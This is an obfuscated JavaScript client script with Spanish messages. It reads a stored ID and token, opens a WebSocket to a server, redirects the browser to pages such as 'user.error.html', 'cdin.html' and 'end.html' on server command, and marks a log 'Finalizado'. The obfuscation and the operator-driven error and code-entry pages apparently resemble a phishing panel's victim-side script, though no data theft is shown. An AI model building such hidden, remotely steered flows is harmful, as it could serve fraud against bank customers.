function _0x1fe2(_0x4b6265, _0xd56e90) {
  const _0x1b5499 = _0x1b54();
  return (
    (_0x1fe2 = function (_0x1fe2d8, _0x55d01f) {
      _0x1fe2d8 = _0x1fe2d8 - 0x180;
      let _0x592b2b = _0x1b5499[_0x1fe2d8];
      return _0x592b2b;
    }),
    _0x1fe2(_0x4b6265, _0xd56e90)
  );
}
function _0x1b54() {
  const _0x495c14 = [
    "1180487TvDYwF",
    "Conectado\x20al\x20WebSocket",
    "165702rxBDcd",
    "valor",
    "/dataLogs/updateEndDataLog/",
    "./error.html",
    "22448YMbnxu",
    "Hubo\x20un\x20error\x20al\x20actualizar\x20el\x20estado.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "73269ZZrALC",
    "795VMUGOz",
    "message",
    "location",
    "Error\x20al\x20actualizar\x20el\x20estado:",
    "application/json",
    "dataLogId",
    "Hubo\x20un\x20error\x20al\x20cargar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "49SWsONQ",
    "connect",
    "./user.error.html",
    "end",
    "error",
    "log",
    "valid",
    "82202oEuIKO",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "href",
    "PUT",
    "getItem",
    "17084790zsOEVa",
    "Finalizado",
    "data",
    "252035blNamr",
    "Error\x20en\x20el\x20PUT\x20a\x20updateEndDataLog",
    "264qjOALk",
  ];
  _0x1b54 = function () {
    return _0x495c14;
  };
  return _0x1b54();
}
const _0x1a4b77 = _0x1fe2;
(function (_0x36caa2, _0x34f7bf) {
  const _0x16202c = _0x1fe2,
    _0x1785cf = _0x36caa2();
  while (!![]) {
    try {
      const _0x1925ef =
        parseInt(_0x16202c(0x19d)) / 0x1 +
        -parseInt(_0x16202c(0x192)) / 0x2 +
        (-parseInt(_0x16202c(0x184)) / 0x3) *
          (-parseInt(_0x16202c(0x181)) / 0x4) +
        parseInt(_0x16202c(0x19a)) / 0x5 +
        (parseInt(_0x16202c(0x19f)) / 0x6) *
          (parseInt(_0x16202c(0x18b)) / 0x7) +
        (parseInt(_0x16202c(0x19c)) / 0x8) *
          (-parseInt(_0x16202c(0x183)) / 0x9) +
        -parseInt(_0x16202c(0x197)) / 0xa;
      if (_0x1925ef === _0x34f7bf) break;
      else _0x1785cf["push"](_0x1785cf["shift"]());
    } catch (_0x4f1433) {
      _0x1785cf["push"](_0x1785cf["shift"]());
    }
  }
})(_0x1b54, 0xda0e8);
const dataLogId = localStorage[_0x1a4b77(0x196)](_0x1a4b77(0x189)),
  token = localStorage[_0x1a4b77(0x196)]("dataLogToken");
(!dataLogId || !token) &&
  (console[_0x1a4b77(0x18f)](_0x1a4b77(0x193)),
  alert(_0x1a4b77(0x18a)),
  (window[_0x1a4b77(0x186)][_0x1a4b77(0x194)] = _0x1a4b77(0x180)));
const socket = io(url, { query: { token: token } });
socket["on"](_0x1a4b77(0x18c), () =>
  console[_0x1a4b77(0x190)](_0x1a4b77(0x19e))
),
  socket["on"]("connect_error", (_0x1cb8d5) =>
    console[_0x1a4b77(0x18f)](
      "Error\x20de\x20conexión:",
      _0x1cb8d5[_0x1a4b77(0x185)]
    )
  ),
  socket["on"](_0x1a4b77(0x199), async (_0x3e6c5e) => {
    const _0x17a36f = _0x1a4b77;
    console[_0x17a36f(0x190)]("Datos\x20recibidos:", _0x3e6c5e),
      console[_0x17a36f(0x190)]("ID\x20de\x20dataLog:", dataLogId);
    if (String(_0x3e6c5e[_0x17a36f(0x191)]) !== String(dataLogId)) return;
    const _0x10ea0d = {
      us: _0x17a36f(0x18d),
      din: "./cdin.html",
      new_din: "./cdin.error.html",
      end: "./end.html",
    };
    if (_0x3e6c5e[_0x17a36f(0x1a0)] in _0x10ea0d) {
      if (_0x3e6c5e["valor"] === _0x17a36f(0x18e))
        try {
          await updateStatus();
        } catch (_0x3c5ed1) {
          console[_0x17a36f(0x18f)](_0x17a36f(0x187), _0x3c5ed1),
            alert(_0x17a36f(0x182));
          return;
        }
      window[_0x17a36f(0x186)][_0x17a36f(0x194)] =
        _0x10ea0d[_0x3e6c5e[_0x17a36f(0x1a0)]];
    }
  });
async function updateStatus() {
  const _0x43dd7e = _0x1a4b77;
  try {
    const _0x15d758 = await fetch(url + _0x43dd7e(0x1a1) + dataLogId, {
      method: _0x43dd7e(0x195),
      headers: {
        "Content-Type": _0x43dd7e(0x188),
        Authorization: "Bearer\x20" + token,
        Origin: window["location"]["origin"],
      },
      body: JSON["stringify"]({ status: _0x43dd7e(0x198) }),
    });
    if (!_0x15d758["ok"]) {
      const _0x4a8878 = await _0x15d758["json"]();
      throw new Error(_0x4a8878["error"] || _0x43dd7e(0x19b));
    }
    console[_0x43dd7e(0x190)](
      "Estado\x20actualizado\x20correctamente\x20en\x20el\x20servidor."
    );
  } catch (_0x4b354b) {
    throw _0x4b354b;
  }
}
